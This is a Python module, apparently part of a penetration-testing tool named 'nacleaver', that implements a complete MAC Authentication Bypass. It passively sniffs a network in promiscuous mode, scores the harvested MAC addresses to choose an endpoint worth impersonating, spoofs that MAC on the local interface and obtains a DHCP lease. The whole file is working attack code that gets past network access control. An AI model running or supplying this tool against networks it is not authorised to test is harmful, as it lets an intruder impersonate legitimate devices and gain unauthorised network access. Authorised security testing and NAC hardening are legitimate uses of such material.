import csv
import logging
import re
import sqlite3
import time
from contextlib import closing
from dataclasses import dataclass
from functools import lru_cache
from pathlib import Path

from data.oui_seed import AMBIGUOUS_OUI_PREFIXES

from core.utils import (
    Cleanup,
    DHCPLeaseResult,
    get_iface_mac,
    get_iface_state,
    is_locally_administered_mac,
    is_multicast_mac,
    normalize_mac,
    request_network_lease,
    set_iface_mac,
    validate_mac,
)

logger = logging.getLogger('nacleaver')

_DB_PATH = Path(__file__).parent.parent / "data" / "oui.db"
_IEEE_CSV = Path(__file__).parent.parent / "data" / "oui_full.csv"
_SYSTEM_OUI_PATHS = (
    Path("/usr/share/ieee-data/oui.txt"),
    Path("/var/lib/ieee-data/oui.txt"),
    Path("/usr/share/hwdata/oui.txt"),
)


@dataclass
class MACEntry:
    mac: str
    oui_prefix: str = ""
    vendor: str = "Unknown Vendor"
    category: str = "unknown"
    frame_count: int = 0
    arp_seen: bool = False
    ipv4_seen: bool = False
    ipv6_seen: bool = False
    stp_seen: bool = False
    cdp_lldp_seen: bool = False
    first_seen: float = 0.0
    last_seen: float = 0.0
    score: float = 0.0
    eligible: bool = False
    rejection_reason: str | None = None


@dataclass
class MABResult:
    success: bool
    spoofed_mac: str | None
    obtained_ip: str | None
    original_mac: str
    candidates: list[MACEntry]
    error: str | None = None
    gateway: str | None = None
    dhcp_returncode: int | None = None
    duration_sec: float = 0.0
    method: str = "mab"
    address_family: str | None = None


def _classify_vendor(vendor: str) -> str:
    v = vendor.lower()
    workstation_kw = ['dell', 'lenovo', 'lcfc', 'hewlett', ' hp ', 'intel corporate', 'apple',
                      'microsoft', 'realtek', 'asustek', 'gigabyte', 'acer', 'samsung electronics']
    network_kw = ['cisco', 'juniper', 'aruba', 'extreme', 'huawei', 'tp-link',
                  'netgear', 'palo alto', 'check point', 'fortinet']
    printer_kw = ['xerox', 'lexmark', 'brother', 'ricoh', 'canon', 'epson', 'kyocera', 'konica']
    mobile_kw = ['qualcomm', 'mediatek', 'oneplus', 'xiaomi', 'oppo', 'vivo']

    for kw in workstation_kw:
        if kw in v:
            return 'workstation'
    for kw in network_kw:
        if kw in v:
            return 'network'
    for kw in printer_kw:
        if kw in v:
            return 'printer'
    for kw in mobile_kw:
        if kw in v:
            return 'mobile'
    return 'unknown'


def init_oui_db() -> None:
    """Seed oui.db from built-in data on first run.
    If oui_full.csv is present and newer than the DB, import it on top.
    Expected IEEE MA-L format: Registry,Assignment,Organization Name,...
    """
    if _DB_PATH.exists():
        # DB exists — still check if the IEEE CSV needs to be ingested (first-run with CSV).
        # We use a sentinel: if the CSV is present and newer than the DB, re-ingest.
        if _IEEE_CSV.exists():
            db_mtime = _DB_PATH.stat().st_mtime
            csv_mtime = _IEEE_CSV.stat().st_mtime
            if csv_mtime <= db_mtime:
                return  # CSV already ingested
        else:
            return  # No CSV, DB is fresh enough

    from data.oui_seed import OUI_SEED

    conn = sqlite3.connect(str(_DB_PATH))
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS oui (
            prefix TEXT PRIMARY KEY,
            vendor TEXT NOT NULL,
            category TEXT NOT NULL DEFAULT 'unknown'
        )
    """)

    entries = []
    for prefix, (vendor, category) in OUI_SEED.items():
        clean_prefix = prefix.replace(' ', '').upper()
        if len(clean_prefix) != 6:
            continue
        entries.append((clean_prefix, vendor, category))

    cursor.executemany(
        "INSERT OR IGNORE INTO oui (prefix, vendor, category) VALUES (?, ?, ?)",
        entries
    )
    conn.commit()
    logger.debug(f"OUI database seeded with {len(entries)} built-in entries")

    # Optional fast-path: load full IEEE OUI CSV when present
    if _IEEE_CSV.exists():
        ieee_rows = []
        try:
            with open(_IEEE_CSV, newline='', encoding='utf-8', errors='replace') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    prefix = row.get('Assignment', '').strip().upper()
                    vendor = row.get('Organization Name', '').strip()
                    if len(prefix) == 6 and vendor:
                        category = _classify_vendor(vendor)
                        ieee_rows.append((prefix, vendor, category))
            conn.executemany(
                "INSERT OR REPLACE INTO oui (prefix, vendor, category) VALUES (?, ?, ?)",
                ieee_rows
            )
            conn.commit()
            logger.info(f"OUI DB loaded {len(ieee_rows)} entries from {_IEEE_CSV.name}")
        except (OSError, csv.Error, KeyError) as e:
            logger.warning(f"Failed to load IEEE OUI CSV: {e}")

    conn.close()


@lru_cache(maxsize=1)
def _load_system_oui() -> dict[str, str]:
    """Load the first available distro-provided IEEE OUI registry once."""
    for path in _SYSTEM_OUI_PATHS:
        if not path.is_file():
            continue
        entries: dict[str, str] = {}
        try:
            with path.open(encoding="utf-8", errors="replace") as handle:
                for line in handle:
                    match = re.match(
                        r"^([0-9A-Fa-f]{2})-([0-9A-Fa-f]{2})-([0-9A-Fa-f]{2})\s+\(hex\)\s+(.+?)\s*$",
                        line,
                    )
                    if match:
                        prefix = "".join(match.group(i) for i in range(1, 4)).upper()
                        entries[prefix] = match.group(4).strip()
            if entries:
                logger.debug(f"Loaded {len(entries)} OUIs from {path}")
                return entries
        except OSError as exc:
            logger.debug(f"Unable to read system OUI registry {path}: {exc}")
    return {}


@lru_cache(maxsize=4)
def _load_ieee_oui(path: str, modified_ns: int) -> dict[str, str]:
    """Read an explicitly supplied IEEE registry for ambiguous seed prefixes."""
    del modified_ns  # The mtime is part of the cache key, not the CSV content.
    entries: dict[str, str] = {}
    try:
        with open(path, newline="", encoding="utf-8", errors="replace") as handle:
            for row in csv.DictReader(handle):
                prefix = (row.get("Assignment") or "").strip().upper()
                vendor = (row.get("Organization Name") or "").strip()
                if re.fullmatch(r"[0-9A-F]{6}", prefix) and vendor:
                    entries[prefix] = vendor
    except (OSError, csv.Error) as exc:
        logger.warning(f"Unable to read IEEE OUI registry {path}: {exc}")
    return entries


def lookup_oui(mac: str) -> tuple[str, str]:
    """Return vendor/category using the local DB and system IEEE registry fallback."""
    init_oui_db()
    try:
        prefix = normalize_mac(mac).replace(":", "").upper()[:6]
    except ValueError:
        return "Unknown Vendor", "unknown"

    # Old local DB files can still contain a conflicting built-in assignment.
    # Resolve these from an authoritative registry, never from that cached row.
    if prefix in AMBIGUOUS_OUI_PREFIXES and _IEEE_CSV.is_file():
        vendor = _load_ieee_oui(str(_IEEE_CSV), _IEEE_CSV.stat().st_mtime_ns).get(prefix)
        if vendor:
            return vendor, _classify_vendor(vendor)
    if prefix not in AMBIGUOUS_OUI_PREFIXES:
        try:
            with closing(sqlite3.connect(str(_DB_PATH))) as conn:
                row = conn.execute(
                    "SELECT vendor, category FROM oui WHERE prefix = ?", (prefix,)
                ).fetchone()
                if row:
                    return row[0], row[1]
        except sqlite3.Error as exc:
            logger.debug(f"OUI DB lookup error: {exc}")

    vendor = _load_system_oui().get(prefix)
    if not vendor:
        return "Unknown Vendor", "unknown"
    category = _classify_vendor(vendor)
    try:
        with closing(sqlite3.connect(str(_DB_PATH))) as conn:
            conn.execute(
                "INSERT OR REPLACE INTO oui (prefix, vendor, category) VALUES (?, ?, ?)",
                (prefix, vendor, category),
            )
    except sqlite3.Error as exc:
        logger.debug(f"Unable to cache OUI {prefix}: {exc}")
    return vendor, category


def _compute_score(entry: MACEntry) -> float:
    score = float(min(entry.frame_count, 100))
    score += 15.0 if entry.arp_seen else 0
    score += 8.0 if entry.ipv4_seen else 0
    score += 8.0 if entry.ipv6_seen else 0
    score -= 60.0 if entry.stp_seen else 0
    score -= 60.0 if entry.cdp_lldp_seen else 0
    score += 25.0 if entry.category == "workstation" else 0
    score += 5.0 if entry.category == "mobile" else 0
    score -= 10.0 if entry.category == "printer" else 0
    score -= 100.0 if entry.category == "network" else 0
    return score


def _assess_candidate(entry: MACEntry, min_score: float) -> None:
    reasons = []
    if entry.category == "network":
        reasons.append("network-device OUI")
    if entry.stp_seen or entry.cdp_lldp_seen:
        reasons.append("control-plane traffic")
    if not (entry.arp_seen or entry.ipv4_seen or entry.ipv6_seen):
        reasons.append("no ARP/IPv4/IPv6 endpoint evidence")
    if entry.score < min_score:
        reasons.append(f"score below {min_score:g}")
    entry.eligible = not reasons
    entry.rejection_reason = "; ".join(reasons) or None


def select_mab_candidate(candidates: list[MACEntry], min_score: float = 15.0) -> MACEntry | None:
    for entry in candidates:
        _assess_candidate(entry, min_score)
    eligible = [entry for entry in candidates if entry.eligible]
    return max(eligible, key=lambda entry: entry.score, default=None)


# CDP/LLDP multicast addresses that indicate network device traffic
_CDP_LLDP_MCAST = {
    '01:00:0c:cc:cc:cc',  # CDP
    '01:80:c2:00:00:0e',  # LLDP
    '01:80:c2:00:00:00',  # STP
    '01:80:c2:00:00:03',  # 802.1X
}


def harvest_macs(
    iface: str,
    duration: int = 60,
    min_score: float = 15.0,
    verbose: bool = False,
) -> list[MACEntry]:
    """Passively capture MAC addresses from all frames for `duration` seconds."""
    from scapy.all import sniff, conf, STP, ARP, IP, IPv6

    own_mac = get_iface_mac(iface)
    entries: dict[str, MACEntry] = {}

    original_promisc = conf.sniff_promisc
    conf.sniff_promisc = True

    if verbose:
        logger.info(f"[mab] Harvesting MACs on {iface} for {duration}s ...")

    def _handle_frame(pkt):
        try:
            src_mac = pkt.src
        except AttributeError:
            return

        if not src_mac:
            return
        if is_multicast_mac(src_mac):
            return
        if src_mac.lower() == 'ff:ff:ff:ff:ff:ff':
            return
        if src_mac.lower() == own_mac.lower():
            return
        if is_locally_administered_mac(src_mac):
            return

        now = time.time()
        mac_norm = normalize_mac(src_mac)

        if mac_norm not in entries:
            entries[mac_norm] = MACEntry(
                mac=mac_norm,
                first_seen=now,
                last_seen=now,
                frame_count=1,
            )
        else:
            entries[mac_norm].frame_count += 1
            entries[mac_norm].last_seen = now

        e = entries[mac_norm]

        try:
            if pkt.haslayer(ARP):
                e.arp_seen = True
        except Exception as exc:
            logger.debug(f"[mab] ARP layer parse error: {exc}")

        try:
            if pkt.haslayer(IP):
                e.ipv4_seen = True
        except Exception as exc:
            logger.debug(f"[mab] IPv4 layer parse error: {exc}")

        try:
            if pkt.haslayer(IPv6):
                e.ipv6_seen = True
        except Exception as exc:
            logger.debug(f"[mab] IPv6 layer parse error: {exc}")

        try:
            if pkt.haslayer(STP):
                e.stp_seen = True
        except Exception as exc:
            logger.debug(f"[mab] STP layer parse error: {exc}")

        try:
            dst = pkt.dst.lower() if hasattr(pkt, 'dst') else ''
            if dst in _CDP_LLDP_MCAST or getattr(pkt, 'type', 0) == 0x88CC:
                e.cdp_lldp_seen = True
        except Exception as exc:
            logger.debug(f"[mab] discovery frame parse error: {exc}")

    try:
        sniff(iface=iface, store=False, prn=_handle_frame, timeout=duration)
    finally:
        conf.sniff_promisc = original_promisc

    # Resolve OUI and compute scores
    for mac_norm, entry in entries.items():
        prefix = mac_norm.replace(':', '').upper()[:6]
        entry.oui_prefix = prefix
        entry.vendor, entry.category = lookup_oui(mac_norm)
        entry.score = _compute_score(entry)
        _assess_candidate(entry, min_score)

    sorted_entries = sorted(entries.values(), key=lambda e: e.score, reverse=True)

    if verbose:
        logger.info(f"[mab] Captured {len(sorted_entries)} unique MACs")
        for e in sorted_entries[:5]:
            status = "eligible" if e.eligible else f"rejected: {e.rejection_reason}"
            logger.info(f"  {e.mac} [{e.vendor}] score={e.score:.1f} ({status})")

    return sorted_entries


def spoof_mac(
    iface: str,
    target_mac: str,
    no_restore: bool = False,
    dhcp_timeout: int = 30,
) -> DHCPLeaseResult:
    """Take exclusive interface ownership, spoof MAC, and obtain IPv4/IPv6."""
    started = time.monotonic()
    if not validate_mac(target_mac):
        return DHCPLeaseResult(False, None, None, 1, 0.0, f"Invalid MAC format: {target_mac}")

    original_mac = get_iface_mac(iface)
    prepared, error = Cleanup.prepare_interface(iface)
    if not prepared:
        Cleanup.restore_interface(iface)
        return DHCPLeaseResult(False, None, None, 1, time.monotonic() - started, error)
    if no_restore:
        Cleanup.disable_mac_restore()

    logger.info(f"[mab] Spoofing MAC on {iface}: {original_mac} → {target_mac}")
    changed, error = set_iface_mac(iface, target_mac)
    if not changed:
        Cleanup.restore_interface(iface)
        return DHCPLeaseResult(False, None, None, 1, time.monotonic() - started, error)

    # Wait briefly for Ethernet autonegotiation/carrier before DHCP.
    carrier_deadline = time.monotonic() + min(8, max(2, dhcp_timeout // 3))
    while time.monotonic() < carrier_deadline:
        if get_iface_state(iface) == "up":
            break
        time.sleep(0.2)

    logger.info("[mab] MAC set and verified; requesting IPv4/IPv6 addressing ...")
    lease = request_network_lease(iface, timeout=dhcp_timeout)
    if lease.success:
        logger.info(
            f"[mab] {lease.address_family} address obtained: "
            f"IP={lease.ip}, gateway={lease.gateway}"
        )
        return lease

    logger.warning(f"[mab] Address acquisition failed after MAC spoof: {lease.error}")
    Cleanup.restore_interface(iface)
    return lease


def restore_mac(iface: str, original_mac: str) -> bool:
    """Restore and verify an original MAC address."""
    restored, error = set_iface_mac(iface, original_mac)
    if not restored:
        logger.error(f"[mab] MAC restore failed on {iface}: {error}")
    return restored

def run_mab_bypass(
    iface: str,
    target_mac: str | None = None,
    harvest_duration: int = 60,
    min_score: float = 15.0,
    dhcp_timeout: int = 30,
    no_restore: bool = False,
    verbose: bool = False,
) -> MABResult:
    """Full MAB bypass: harvest → select → spoof → DHCP."""
    original_mac = get_iface_mac(iface)
    candidates: list[MACEntry] = []

    if target_mac is None:
        candidates = harvest_macs(
            iface, duration=harvest_duration, min_score=min_score, verbose=verbose
        )
        selected = select_mab_candidate(candidates, min_score=min_score)
        if selected is None:
            logger.error("[mab] No endpoint-like MAC candidates passed safety scoring")
            return MABResult(
                success=False,
                spoofed_mac=None,
                obtained_ip=None,
                original_mac=original_mac,
                candidates=candidates,
                error="No endpoint-like MAC candidates passed safety scoring",
            )
        target_mac = selected.mac
        logger.info(
            f"[mab] Best candidate: {target_mac} "
            f"(score={selected.score:.1f}, vendor={selected.vendor})"
        )

    started = time.monotonic()
    lease = spoof_mac(
        iface, target_mac, no_restore=no_restore, dhcp_timeout=dhcp_timeout
    )

    return MABResult(
        success=lease.success,
        spoofed_mac=target_mac,
        obtained_ip=lease.ip,
        original_mac=original_mac,
        candidates=candidates,
        error=None if lease.success else (lease.error or "MAC spoof or address acquisition failed"),
        gateway=lease.gateway,
        dhcp_returncode=lease.returncode,
        duration_sec=time.monotonic() - started,
        address_family=lease.address_family if lease.success else None,
    )


if __name__ == "__main__":
    import sys
    from rich import print as rprint
    from core.utils import require_root, setup_logging
    require_root()
    setup_logging(verbose=True)
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    result = run_mab_bypass(iface, harvest_duration=30, verbose=True)
    rprint(result)
